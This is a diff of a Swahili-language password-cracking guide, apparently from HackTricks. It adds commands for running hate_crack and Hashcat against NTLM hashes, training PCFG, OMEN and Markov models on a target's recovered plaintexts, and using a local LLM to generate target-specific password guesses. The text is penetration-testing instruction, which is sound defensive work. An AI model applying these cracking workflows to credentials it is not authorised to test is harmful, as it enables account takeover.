+Mstari wenye hitilafu unaweza kupuuzwa kati ya masks halali, kwa hivyo thibitisha faili lote na keyspace yake inayokadiriwa kabla ya kuanzisha shambulio. HashcatRosetta huripoti mstari wenye hitilafu na kurejesha hali isiyo sifuri ikiwa mask yoyote si halali, hivyo ukaguzi huu unafaa kwa scripts au CI.<sup>[[6]](#references)[[9]](#references)</sup>
 
 ```bash
 hashcat-rosetta masks.hcmask --verify-masks
 ```
 
-Usifanye normalization ya mask files kwa kutumia generic CSV au text parsers. Hashcat inasaidia custom charsets `?1` hadi `?8`, huchukulia `#` kuwa comment pale tu inapokuwa byte ya kwanza, na huondoa backslash escapes kwa pass moja kabla ya kutafsiri `?` tokens. Kwa hiyo, whitespace inayoongoza kabla ya `#` ni mask data, na escaping inaweza kubadilisha kama mfuatano ni literal au charset token.<sup>[[6]](#references)[[9]](#references)</sup>
+Usirekebishe mask files kwa kutumia generic CSV au text parsers. Hashcat hutumia custom charsets `?1` hadi `?8`, huchukulia `#` kuwa comment tu ikiwa ndiyo byte ya kwanza, na huondoa backslash escapes kwa hatua moja kabla ya kutafsiri `?` tokens. Kwa hiyo, whitespace inayoongoza `#` huwa mask data, na escaping inaweza kubadilisha kama mfuatano ni literal au charset token.<sup>[[6]](#references)[[9]](#references)</sup>
 
 - Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) attack
 
@@ -935,13 +935,60 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
 
-#### Aina za Hashcat
+#### Mizunguko ya Hashcat iliyofunzwa kwa data ya mlengwa kupitia hate_crack
+
+[hate_crack](https://github.com/trustedsec/hate_crack) huratibu mizunguko ya Hashcat inayotekelezwa kwenye kompyuta ya ndani baada ya kuwa na faili ya hash na kujua mode yake ya Hashcat. Hashcat yenyewe lazima isakinishwe kando. Fanya clone pamoja na submodules, endesha `make`, kisha anza session ya maingiliano; mode ya mfano `1000` ni ya NTLM, si chaguo-msingi linalofaa kwa kila hali. Clone zilizopo zinahitaji `git submodule update --init --recursive` kabla ya kutumia chaguo za PCFG na PRINCE-LING.<sup>[[13]](#references)[[14]](#references)</sup>
+
+```bash
+git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
+cd hate_crack
+make
+hate_crack hashes.txt 1000
+```
+
+**Jifunze sarufi kutokana na maandishi wazi yaliyorejeshwa.** Anza kwa kupitisha kamusi na kanuni, kisha fundisha `pcfg_cracker` kwa maandishi wazi yanayohusiana na lengo. Weka `pcfgRuleset` katika `config.json` iwe ruleset iliyofundishwa, kisha chagua PCFG (menu `20`) ili kutuma miundo inayowezekana kwa Hashcat, au PRINCE-LING (`21`) ili kuunda orodha msingi ya PRINCE inayoongozwa na sarufi. Weka kikomo cha jenereta hizi mbili kwa kutumia `pcfgMaxCandidates` na `pcfgPrinceLingMaxCandidates`; hate_crack haikufundishii sarufi. PCFG hujifunza uwezekano wa miundo kama neno la msingi likifuatiwa na tarakimu na alama, tofauti na sarufi isiyobadilika katika [mfano wa combinator](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>
+
+```bash
+cd pcfg_cracker
+python3 trainer.py -t ../target-plaintexts.txt -r TARGET
+cd ..
+# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
+hate_crack hashes.txt 1000
+```
+
+**Chimba rules kwa kuzifuatilia kinyume kutoka kwenye password zinazojulikana.** Spoonman (menu `22`) huchukua plaintext corpus, ikijumuisha faili `.out` isiyo tupu ya session ya sasa, na hutengeneza basewords za herufi ndogo pamoja na Hashcat rules zinazounda upya password zilizoonekana. Hupanga rules kulingana na idadi ya password za corpus wanazozalisha upya. Anza na kiwango cha coverage cha juu-50%, kisha panua tu ikiwa keyspace iliyoongezwa inahalalika; changanya basewords zilizotokana na maneno na wordlists nyingine husika pale ambapo stem inayokosekana, badala ya mutation, inapozuia coverage. Hashcat hukubali kiwango cha juu cha functions 31 kwa rule, na position alphabet yake hushughulikia faharasa `0`–`35` pekee; Spoonman hutumia baseword halisi na no-op rule pale password haiwezi kuwakilishwa. Corpus kubwa sana zinaweza kufikia kikomo cha counter chenye memory iliyowekewa kiwango, kwa hiyo soma coverage iliyoripotiwa badala ya kudhani kuwa kila kitu kimeundwa upya. Tazama [tabia ya Hashcat rules](#explain-and-profile-rule-files) kabla ya kutumia matokeo kwa kujitegemea.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
+
+**Chagua generator kulingana na ushahidi unaopatikana.** OMEN (`13`) hufunza character-transition model kutoka kwenye password list na kuorodhesha candidates kwa mpangilio wa probability, huku `omenMaxCandidates` ikiweka kikomo. Markov brute force (`15`) inaweza badala yake kutengeneza jedwali la `.hcstat2` kutoka kwenye cracks za `.out` za sasa au list iliyochaguliwa, kisha kujaribu incremental length range. Ushauri wa target ukiwa prose badala ya password, N-gram (`16`) hupeleka corpus, ikijumuisha ingizo la gzip, kwa `ngramX.bin`; group size yake ya chaguo-msingi ni tatu. Hizi ni njia mbadala, si nakala tatu za candidate list ileile.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>
+
+**Panua pools ndogo zinazoaminika pekee.** Permutation (`17`) hupanga upya kila herufi katika kila neno la ingizo, kwa hiyo hata neno moja lenye herufi nane huzalisha mpangilio `8!`. Combipow (`19`) hutoa combinations za subset zisizo tupu kutoka kwenye pool fupi ya maneno ya passphrase; `-s` huingiza nafasi, na tool hukataa zaidi ya mistari 63 ya ingizo. Combinator (`6`) inaweza kuunganisha wordlists nyingi kwa separators kupitia `--sepFill`; uunganishaji wa kawaida wa wordlists mbili unashughulikiwa na [native Hashcat combinator](#hashcat-attacks) hapo juu.<sup>[[13]](#references)[[14]](#references)</sup>
+
+**Panga bajeti ya mashambulizi ya feedback.** Fingerprint (`5`) hupanua password mpya zilizopatikana kwa kurudia, kwa urefu wa fragments unaoongezeka, badala ya kupanua corpus nzima tena kila raundi; kizingiti cha keyspace ya combinations huruka pass ya `-a 1` iliyo kubwa kupita kiasi. Hybrid (`7`) hujaribu mapambo ya gharama ndogo ya `?s?d` kabla ya masks pana za `?a` ya mwanzo/mwisho, huku `hcatHybridMaxRuntime` ikiweka kikomo cha muda wa run. Hili ni muhimu kwa sababu gharama ya hybrid pass ni ukubwa wa wordlist ukizidishwa na mask space, kwa hiyo mask pana dhidi ya list kubwa inaweza kuzidi sana passes za mwanzo.<sup>[[13]](#references)[[14]](#references)</sup>
+
+**Tengeneza candidates kutoka kwenye password zilizorejeshwa kwa kutumia local LLM.** Baada ya pass ya mwanzo kutoa `<hashfile>.out` isiyo tupu, LLM attack ya hate_crack (main menu `12`, submenu ya **Cracked passwords** `3`) inaweza kukisia basewords, years, suffixes na casing mahususi kwa target, kisha kuwasilisha candidates mpya kwa Hashcat. Corpus ndogo zinaweza kujumuisha plaintexts zilizorejeshwa kwenye model prompt; corpus kubwa zaidi hufupishwa kuwa takwimu badala yake. Hii hupanua desturi zilizoonekana badala ya kurudia tu [rules](#explain-and-profile-rule-files) au [masks](#hashcat-attacks) zilizowekwa hapo juu.<sup>[[13]](#references)[[14]](#references)</sup>
+
+Sanidi model ya Ollama ya local ambayo tayari inahudumiwa kwenye `.env` ya hate_crack; haitoi model yenyewe. `OLLAMA_NO_CLOUD=true` hukataa models zilizo na cloud tag na anwani za endpoint za nje ya tovuti. Endpoint ya localhost pekee haitoshi: Ollama inaweza kuelekeza model ya `-cloud` kwa mbali, na prompts zinaweza kuwa na plaintexts zilizorejeshwa au takwimu za corpus. Mpangilio huu bado unaruhusu endpoints za private network na hauwezi kuzuia transport proxy, kwa hiyo hakiki njia ya inference kabla ya kutuma data ya mteja.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
+
+```dotenv
+LLM_BACKEND=ollama
+OLLAMA_HOST=localhost:11434
+OLLAMA_MODEL=qwen3:4b-instruct
+OLLAMA_NO_CLOUD=true
+```
+
+```bash
+hate_crack hashes.txt 1000
+# Select 12 (LLM Attack), then 3 (Cracked passwords).
+```
+
+Linganisha yield ya candidates na majaribio ya rule, mask, na target-trained yenye gharama nafuu kabla ya kutenga budget kubwa zaidi. Model hutengeneza guesses; Hashcat bado huzijaribu dhidi ya hashes.<sup>[[13]](#references)[[14]](#references)</sup>
+
+#### Hashcat modes
 
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
 
-Cracking Linux Hashes - faili ya /etc/shadow
+Kuvunja Linux Hashes - faili ya /etc/shadow file
 
 ```
  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
@@ -971,13 +1018,19 @@ Cracking Hashes za Programu za Kawaida
 
 ## References
 
-- [1] [Ndani ya GoBruteforcer: Mipangilio chaguomsingi ya seva iliyoundwa na AI, nywila dhaifu, na kampeni zinazolenga crypto](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [Ndani ya GoBruteforcer: Mipangilio chaguomsingi ya seva iliyozalishwa na AI, nywila dhaifu na kampeni zinazolenga crypto](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 - [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
-- [3] [Hashi za mfano za Hashcat na modi za Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
+- [3] [Hashi za mfano za Hashcat na mode za Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
 - [4] [Shambulio la combinator la Hashcat](https://hashcat.net/wiki/doku.php?id=combinator_attack)
-- [5] [Mipango ya urithi wa credentials](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
-- [6] [Repository ya HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
+- [5] [Mipango ya urithi wa vitambulisho](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
+- [6] [Hifadhi ya HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
 - [7] [Utekelezaji wa faili ya debug ya Hashcat](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
 - [8] [Msaada wa mstari wa amri wa Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
-- [9] [HashcatRosetta: Kusoma Jiwe la Rosetta la uvunjaji wa nywila](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
+- [9] [HashcatRosetta: Kusoma Jiwe la Rosetta la Kuvunja Nywila](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
+- [10] [Hifadhi na matumizi ya PCFG Cracker](https://github.com/lakiw/pcfg_cracker)
+- [11] [Hifadhi na mwongozo wa mtumiaji wa OMEN](https://github.com/RUB-SysSec/OMEN)
+- [12] [Suala la awali la Spoonman na muundo wa utohozi wa kanuni](https://github.com/trustedsec/hate_crack/issues/169)
+- [13] [Hifadhi ya hate_crack na nyaraka za mashambulio](https://github.com/trustedsec/hate_crack)
+- [14] [Mambo mapya katika hate_crack tangu 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
+- [15] [Sera ya hate_crack kuhusu marudio ya LLM](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
 {{#include ../banners/hacktricks-training.md}}
